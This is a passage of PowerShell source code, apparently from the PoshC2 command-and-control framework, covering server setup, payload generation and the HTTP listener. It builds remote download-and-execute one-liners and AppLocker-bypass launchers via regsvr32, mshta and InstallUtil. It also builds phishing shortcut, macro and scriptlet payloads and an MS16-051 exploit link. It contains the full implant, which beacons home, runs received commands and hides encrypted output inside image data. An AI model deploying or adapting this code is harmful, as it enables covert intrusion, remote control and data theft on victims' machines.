        $ipv4address = ($localipfull,$prompt)[[bool]$prompt]
    }

    $prompthttpsdef = "Yes"
    $prompthttps = Read-Host -Prompt "[2] Do you want to use HTTPS for implant comms? [Yes]"
    $prompthttps = ($prompthttpsdef,$prompthttps)[[bool]$prompthttps]
    if ($prompthttps -eq "Yes") {
    $ipv4address = "https://"+$ipv4address
    $promptssldefault = "Yes"

    #detect if powershell < v4
    $psver = $PSVersionTable.psversion.Major
    if ($psver -lt '4') {
        $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to use the default self-signed SSL certificate [Yes]"
        $promptssl = ($promptssldefault,$promptssl)[[bool]$promptssl]
        if ($promptssl -eq "Yes") {
            CERTUTIL -f -p poshc2 -importpfx "$PoshPath\poshc2.pfx"
            $thumb = "DE5ADA225693F8E0ED43453F3EB512CE96991747"
            $Deleted = netsh.exe http delete sslcert ipport=0.0.0.0:443
            $Added = netsh.exe http add sslcert ipport=0.0.0.0:443 certhash=$thumb "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
            if ($Added = "SSL Certificate successfully added") {
                netsh.exe http show sslcert ipport=0.0.0.0:443
            }
        } else {
            Write-Error "Error adding the certificate" 
            Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
https://www.microsoft.com/en-us/download/details.aspx?id=17275
selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443

or 
    
Download and convert the PEM to PFX for windows import and import to personal:
openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx

Grab the thumbprint:
dir cert:\localmachine\my|% { `$_.thumbprint}

Install using netsh:
netsh http delete sslcert ipport=0.0.0.0:443
netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
"
}
    } else {

    $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to create a new self-signed SSL certificate [Yes]"
    $promptssl = ($promptssldefault,$promptssl)[[bool]$promptssl]
    if ($promptssl -eq "Yes") {
        $thumb = New-SelfSignedCertificate -certstorelocation cert:\localmachine\my -dnsname $ipv4address | select thumbprint -ExpandProperty thumbprint
        $Deleted = netsh.exe http delete sslcert ipport=0.0.0.0:443
        $Added = netsh.exe http add sslcert ipport=0.0.0.0:443 certhash=$thumb "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
        if ($Added = "SSL Certificate successfully added") {
            netsh.exe http show sslcert ipport=0.0.0.0:443
        } else {
            Write-Error "Error adding the certificate" 
            Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
https://www.microsoft.com/en-us/download/details.aspx?id=17275
selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443

or 
    
Download and convert the PEM to PFX for windows import and import to personal:
openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx

Grab the thumbprint:
dir cert:\localmachine\my|% { `$_.thumbprint}

Install using netsh:
netsh http delete sslcert ipport=0.0.0.0:443
netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
"
}
}

}

    $promptdomfrontdef = "No"
    $promptdomfront = Read-Host -Prompt "[2b] Do you want to use domain fronting? [No]"
    $promptdomfront = ($promptdomfrontdef,$promptdomfront)[[bool]$promptdomfront]
    if ($promptdomfront -eq "Yes") {
        $promptdomfront = Read-Host -Prompt "[2c] Please specify the host header for domain fronting?"
        if ($promptdomfront) {
            $domainfrontheader = $promptdomfront
        }
    }

    $defaultserverport = 443
    } else {
    $ipv4address = "http://"+$ipv4address
        $defaultserverport = 80
    }
    
    $global:newdir = 'PoshC2-'+(get-date -Format yyy-dd-MM-HHmm)
    $prompt = Read-Host -Prompt "[3] Enter a new folder name for this project [$($global:newdir)]"
    $tempdir= ($global:newdir,$prompt)[[bool]$prompt]
    $RootFolder = $PoshPath.TrimEnd("PowershellC2\")
    $global:newdir = $RootFolder+"\"+$tempdir

    $defbeacontime = "5s"
    $prompt = Read-Host -Prompt "[4] Enter the default beacon time of the Posh C2 Server - 30s, 5m, 1h (10% jitter is always applied) [$($defbeacontime)]"
    $defaultbeacon = ($defbeacontime,$prompt)[[bool]$prompt]
    if ($defaultbeacon.ToLower().Contains('m')) { 
        $defaultbeacon = $defaultbeacon -replace 'm', ''
        [int]$newsleep = $defaultbeacon 
        [int]$defaultbeacon = $newsleep * 60
    }
    elseif ($defaultbeacon.ToLower().Contains('h')) { 
        $defaultbeacon = $defaultbeacon -replace 'h', ''
        [int]$newsleep1 = $defaultbeacon 
        [int]$newsleep2 = $newsleep1 * 60
        [int]$defaultbeacon = $newsleep2 * 60
    }
    elseif ($defaultbeacon.ToLower().Contains('s')) { 
        $defaultbeacon = $defaultbeacon -replace 's', ''
    } else {
        $defaultbeacon = $defaultbeacon
    }

    $killdatedefault = (get-date).AddDays(14)
    $killdatedefault = (get-date -date $killdatedefault -Format "dd/MM/yyyy")
    $prompt = Read-Host -Prompt "[5] Enter the auto Kill Date of the implants in this format dd/MM/yyyy [$($killdatedefault)]"
    $killdate = ($killdatedefault,$prompt)[[bool]$prompt]
    $killdate = [datetime]::ParseExact($killdate,"dd/MM/yyyy",$null)
    $killdatefm = Get-Date -Date $killdate -Format "dd/MM/yyyy"

    $prompt = Read-Host -Prompt "[6] Enter the HTTP port you want to use, 80/443 is highly preferable for proxying [$($defaultserverport)]"
    $serverport = ($defaultserverport,$prompt)[[bool]$prompt]

    $enablesound = "Yes"
    $prompt = Read-Host -Prompt "[7] Do you want to enable sound? [$($enablesound)]"
    $enablesound = ($enablesound,$prompt)[[bool]$prompt]
    
    $downloaduri = Get-RandomURI -Length 5
    if ($ipv4address.Contains("https")) {
        $shortcut = "powershell -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+"" 
    } else {
        $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+""     
    }

    $httpresponse = '
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache (Debian) Server</address>
</body></html>
    '
    New-Item $global:newdir -Type directory | Out-Null
    New-Item $global:newdir\downloads -Type directory | Out-Null
    New-Item $global:newdir\reports -Type directory | Out-Null
    New-Item $global:newdir\payloads -Type directory | Out-Null
    $Database = "$global:newdir\PowershellC2.SQLite"

    $Query = 'CREATE TABLE Implants (
        ImplantID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        RandomURI VARCHAR(20),
        User TEXT,
        Hostname TEXT,
        IpAddress TEXT,
        Key TEXT,
        FirstSeen TEXT,
        LastSeen TEXT,
        PID TEXT,
        Arch TEXT,
        Domain TEXT,
        Alive TEXT,
        Sleep TEXT,
        ModsLoaded TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE CompletedTasks (
        CompletedTaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        TaskID TEXT,
        RandomURI TEXT,
        Command TEXT,
        Output TEXT,
        Prompt TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE NewTasks (
        TaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        RandomURI TEXT,
        Command TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE Creds (
        credsID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        Username TEXT,
        Password TEXT,
        Hash TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null


    $Query = 'CREATE TABLE C2Server (
        ID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        HostnameIP TEXT,
        DomainFrontHeader TEXT,
        DefaultSleep TEXT,
        KillDate TEXT,
        HTTPResponse TEXT,
        FolderPath TEXT,
        ServerPort TEXT,
        QuickCommand TEXT,
        DownloadURI TEXT,
        ProxyURL TEXT,
        ProxyUser TEXT,
        ProxyPass TEXT,
        Sounds TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'CREATE TABLE History (
        ID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
        Command TEXT)'

    Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null

    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds)
            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds)'

    Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
        DefaultSleep = $defaultbeacon
        KillDate = $killdatefm
        HostnameIP  = $ipv4address
        DomainFrontHeader  = $domainfrontheader
        HTTPResponse = $httpresponse
        FolderPath = $global:newdir
        ServerPort = $serverport
        QuickCommand = $shortcut
        DownloadURI = $downloaduri
        Sounds = $enablesound
    } | Out-Null
        
    Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill Date $killdatefm"`n -ForegroundColor Green
    Write-Host "To quickly get setup for internal pentesting, run:"

    write-host $shortcut `n -ForegroundColor green
    Write-Host "For a more stealthy approach, use SubTee's exploits:"
    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
    write-host ""
    Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
    write-host ""
    Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
    write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
    write-host ""
    # call back command
    $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
function Get-Webclient ($Cookie) {
$d = (Get-Date -Format "dd/MM/yyyy");
$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
if ($k -lt $d) {exit} 
$wc = New-Object System.Net.WebClient; 
$wc.UseDefaultCredentials = $true; 
$wc.Proxy.Credentials = $wc.Credentials;
$h="'+$domainfrontheader+'"
if ($h) {$wc.Headers.Add("Host",$h)}
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
} $wc }
function primer {
if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$p64 = [Convert]::ToBase64String($pre)
$pm = (Get-Webclient -Cookie $p64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
$pm } 
$pm = primer
if ($pm) {$pm| iex} else {
start-sleep 10
primer | iex }'
    Write-Host -Object "For " -NoNewline
    Write-Host -Object "Red Teaming " -NoNewline -ForegroundColor Red
    Write-Host -Object "activities, use the following payloads:" 
    # create payloads
    if ($JDKPath){
        CreateJavaPayload
    } else {
        write-host "Java JDK installer was not found, as a result it cannot create .jar file: "$JDKPath
    }
    # create other payloads

    CreatePayload
    CreateHTAPayload
    CreateMacroPayload
    Create-MS16-051-Payload
    CreateStandAloneExe
    CreateServiceExe
    Write-Host -Object "Phishing .lnk Payload written to: $global:newdir\payloads\PhishingAttack-Link.lnk"  -ForegroundColor Green

    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""

    
    #launch a new powershell session with the implant handler running
    Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"
    Write-Host `n"To re-open the Implant-Handler or C2Server, use the following shortcuts in this directory: "
    Write-Host "$global:newdir" `n  -ForegroundColor Green
    $SourceExe = "powershell.exe"
    $ArgumentsToSourceExe = "-exec bypass -c import-module ${PoshPath}C2-Server.ps1;C2-Server -RestartC2Server '$global:newdir' -PoshPath '$PoshPath'"
    $DestinationPath = "$global:newdir\Restart-C2Server.lnk"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($DestinationPath)
    $Shortcut.TargetPath = $SourceExe
    $Shortcut.Arguments = $ArgumentsToSourceExe
    $Shortcut.Save()
    # add run as administrator 
    $bytes = [System.IO.File]::ReadAllBytes("$global:newdir\Restart-C2Server.lnk")
    $bytes[0x15] = $bytes[0x15] -bor 0x20
    [System.IO.File]::WriteAllBytes("$global:newdir\Restart-C2Server.lnk", $bytes)

    $SourceExe = "powershell.exe"
    $ArgumentsToSourceExe = "-exec bypass -c import-module ${PoshPath}Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"
    $DestinationPath = "$global:newdir\Restart-Implant-Handler.lnk"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($DestinationPath)
    $Shortcut.TargetPath = $SourceExe
    $Shortcut.Arguments = $ArgumentsToSourceExe
    $Shortcut.Save()

    $SourceExe = "powershell.exe"
    $ArgumentsToSourceExe = "-exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+"" 
    $DestinationPath = "$global:newdir\payloads\PhishingAttack-Link.lnk"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($DestinationPath)
    $Shortcut.TargetPath = $SourceExe
    $Shortcut.Arguments = $ArgumentsToSourceExe
    $Shortcut.WindowStyle = 7
    $Shortcut.Save()
}

# add as many images to the images directory as long as the images are less than 1500 bytes in size
$imageArray = @()
$imageFilesUsed = @()
$imageFiles = Get-ChildItem "$PoshPath\Images" | select FullName
$count = 0 

while ($count -lt 5) {

    $randomImage =  $imageFiles | Get-Random 
    $randomImage = $randomImage.FullName
    if (-not ($imageFilesUsed -contains $randomImage)){

        $imageBytes = Get-Content $randomImage -Encoding Byte

        if ($imageBytes.Length -lt 1495) {
            $imageFilesUsed += $randomImage
            $imageBytes = Get-Content $randomImage -Encoding Byte
            $imageArray += [Convert]::ToBase64String($imageBytes)
            $count = $count + 1
        }
    }
}

# C2 server component
$listener = New-Object -TypeName System.Net.HttpListener 

if ($ipv4address.Contains("https")) {
    $listener.Prefixes.Add("https://+:$serverport/") 
} else {
    $listener.Prefixes.Add("http://+:$serverport/") 
}
$readhost = 'PS >'
$listener.Start()

# while the HTTP server is listening do the grunt of the work
while ($listener.IsListening) 
{
    $message = $null
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response       
    if ($request.Url -match "/webapp/static/$($downloaduri)$") 
    {
        $message = $payload
    }
    if ($request.Url -match "/webapp/static/$($downloaduri)_ms16-051$")
    {
        $message = Get-Content -Path $global:newdir/payloads/ms16-051.html
    }
    if ($request.Url -match "/webapp/static/$($downloaduri)_rg$") 
    {

        $payloadparams = $payload -replace "powershell.exe ",""
        $message = '<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    >   
    <script language="VBScript">
        <![CDATA[
            Sub Exec()
            Dim objShell
            set objShell = CreateObject("shell.application")
            objShell.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
            End Sub
            Exec()
        ]]>
    </script>
</registration>
<public>
    <method name="Exec"></method>
</public>
<script language="VBScript">
    <![CDATA[
        Sub Exec()
        Dim objShell
        set objShell = CreateObject("shell.application")
        objShell.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
        End Sub
        Exec()
    ]]>
</script>

</scriptlet>'
    }
    if ($request.Url -match "/webapp/static/$($downloaduri)_cs$") 
    {

        $payloadparams = $payload -replace "powershell.exe ",""
        $message = '<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
	>
</registration>

<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'");	
]]>
</script>

</scriptlet>'
    }
    if (($request.Url -match '/daisy') -and (($request.Cookies[0]).Name -match 'SessionID'))
    {
        # generate randon uri
        $randomuri = Get-RandomURI -Length 15
        $randomuriarray += $randomuri

        # create new key for each implant comms
        $key = Create-AesKey
        $endpointip = $request.RemoteEndPoint
        $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(($request.Cookies[0]).Value))
        $im_domain,$im_username,$im_computername,$im_arch,$im_pid = $cookieplaintext.split(";",5)

        ## add anti-ir and implant safety mechanisms here!
        #
        # if ($im_domain -ne "blorebank") { do something }
        # if ($im_domain -ne "safenet") { do something }
        #
        ## add anti-ir and implant safety mechanisms here!

        Write-Host "New Daisy chain implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
        Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green

        if ($enablesound -eq "Yes") {
            try {
            $voice = New-Object -com SAPI.SpVoice                        
            $voice.rate = -2                        
            $voice.Speak("Nice, we have a daisy chain implant")|Out-Null
            } catch {}
        }

        $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Arch, Domain, Alive, Sleep, ModsLoaded)
        VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded)'

        Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
            RandomURI = $randomuri
            User      = $im_username
            Hostname  = $im_computername
            IpAddress = $request.RemoteEndPoint
            Key       = $key
            FirstSeen = "$(Get-Date)"
            LastSeen  = "$(Get-Date)"
            PID  = $im_pid
            Arch = $im_arch
            Domain = $im_domain
            Alive = "Yes"
            Sleep = $defaultbeacon
            ModsLoaded = ""
        }
        $message = '

$key="' + "$key"+'"
$sleeptime = '+$defaultbeacon+'
$payload = "' + "$payload"+'"

function getimgdata($cmdoutput) {
    $icoimage = "'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'"`,"'+$imageArray[2]+'","'+$imageArray[3]+'"
    $image = $icoimage|get-random

    function randomgen 
    {
        param (
            [int]$Length
        )
        $set = "...................@..........................Tyscf".ToCharArray()
        $result = ""
        for ($x = 0; $x -lt $Length; $x++) 
        {$result += $set | Get-Random}
        return $result
    }
    $imageBytes = [Convert]::FromBase64String($image)
    $maxbyteslen = 1500
    $imagebyteslen = $imageBytes.Length
    $paddingbyteslen = $maxbyteslen - $imagebyteslen

    $BytePadding = [system.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
    $ImagePlusPad = New-Object byte[] $maxbyteslen
    $ImagePlusPadBytes = ($imageBytes+$BytePadding)
    $CombinedBytes = $ImagePlusPadBytes.length

    $CmdBytes = $cmdoutput
    $CmdBytesLen = $CmdBytes.Length

    $CombinedByteSize = $CmdBytesLen + $CombinedBytes
    $FullBuffer = New-Object byte[] $CombinedByteSize

    $FullBuffer = ($ImagePlusPadBytes+$CmdBytes)
    $FullBufferSize = $FullBuffer.length
    return $FullBuffer
}

function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
    if ($IV.getType().Name -eq "String") {
    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
    }
    else {
    $aesManaged.IV = $IV
    }
    }
    if ($key) {
    if ($key.getType().Name -eq "String") {
    $aesManaged.Key = [System.Convert]::FromBase64String($key)
    }
    else {
    $aesManaged.Key = $key
    }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    #$aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    #$aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function Encrypt-String2($key, $unencryptedString) {
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}
function Decrypt-String2($key, $encryptedStringWithIV) {
    $bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
    $output
    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$URI= "'+$randomuri+'"
$Server = "$server/'+$randomuri+'"
$ServerClean = $Server
while($true)
{
    $date = (Get-Date -Format "dd/MM/yyyy")
    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
    $killdate = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null)
    if ($killdate -lt $date) {exit}
    $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
    $newsleep = $sleeptimeran|get-random
    if ($newsleep -lt 1) {$newsleep = 5} 
    start-sleep $newsleep
    $URLS = "images/static/content/","news/?id=","webapp/static/","images/prints/","wordpress/site/","steam?p=","true/images/77/static?","holidngs/images/"
    $RandomURI = Get-Random $URLS
    $Server = "$ServerClean/$RandomURI$URI"
    $ReadCommand = (Get-Webclient).DownloadString("$Server")

     while($ReadCommand) {
        $ReadCommandClear = Decrypt-String $key $ReadCommand
        $error.clear()
        if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
            if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
                    $splitcmd = $ReadCommandClear -replace "multicmd",""
                    $split = $splitcmd -split "!d-3dion@LD!-d"
                    foreach ($i in $split){
                        $error.clear()
                        if  ($i.ToLower().StartsWith("upload-file")) {
                            try {
                                $Output = Invoke-Expression $i | out-string
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                                $ModuleLoaded = Encrypt-String $key $result
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorUpload: " + $error[0]
                            }
                        } elseif  ($i.ToLower().StartsWith("loadmodule")) {
                            try {
                                $modulename = $i -replace "LoadModule",""
                                $Output = Invoke-Expression $modulename | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorLoadMod: " + $error[0]
                            }
                        } else {
                            try {
                                $Output = Invoke-Expression $i | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $StdError = ($error[0] | Out-String)
                                if ($StdError){
                                $Output = $Output + $StdError
                                $error.clear()
                                }
                            } catch {
                                $Output = "ErrorCmd: " + $error[0]
                            }
                            $Output = Encrypt-String2 $key $Output
                            $Response = Encrypt-String $key $i
                            $UploadBytes = getimgdata $Output
                            (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
                        }
                    } 
            }
            elseif  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                try {
                $Output = Invoke-Expression $ReadCommandClear | out-string
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                $ModuleLoaded = Encrypt-String $key $result
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorUpload: " + $error[0]
                }

            } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
                try {
                $modulename = $ReadCommandClear -replace "LoadModule",""
                $Output = Invoke-Expression $modulename | out-string  
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorLoadMod: " + $error[0]
                }

            } else {
                try {
                    $Output = Invoke-Expression $ReadCommandClear | out-string  
                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                    $StdError = ($error[0] | Out-String)
                    if ($StdError){
                    $Output = $Output + $StdError
                    $error.clear()
                    }
                } catch {
                    $Output = "ErrorCmd: " + $error[0]
                }

            $Output = Encrypt-String2 $key $Output
            $UploadBytes = getimgdata $Output
            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null

            }
        }
    break
    }
}'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
$message =[Convert]::ToBase64String($Bytes)

    }
    if (($request.Url -match '/connect') -and (($request.Cookies[0]).Name -match 'SessionID'))
    {
        # generate randon uri
        $randomuri = Get-RandomURI -Length 15
        $randomuriarray += $randomuri

        # create new key for each implant comms
        $key = Create-AesKey
        $endpointip = $request.RemoteEndPoint
        $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(($request.Cookies[0]).Value))
        $im_domain,$im_username,$im_computername,$im_arch,$im_pid = $cookieplaintext.split(";",5)

        ## add anti-ir and implant safety mechanisms here!
        #
        # if ($im_domain -ne "blorebank") { do something }
        # if ($im_domain -ne "safenet") { do something }
        #
        ## add anti-ir and implant safety mechanisms here!

        Write-Host "New host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
        Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green

        # optional clockwork sms on new implant
        $mobilenumber = ""
        $apikey = ""
        if (($apikey) -and ($mobilenumber)){
            (New-Object System.Net.Webclient).DownloadString("https://api.clockworksms.com/http/send.aspx?key=$apikey&to=$mobilenumber&from=PoshC2&content=$im_computername")|Out-Null
        }

        if ($enablesound -eq "Yes") {
            try {
            $voice = New-Object -com SAPI.SpVoice                        
            $voice.rate = -2                        
            $voice.Speak("Nice, we have an implant")|Out-Null
            } catch {}
        }

        $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Arch, Domain, Alive, Sleep, ModsLoaded)
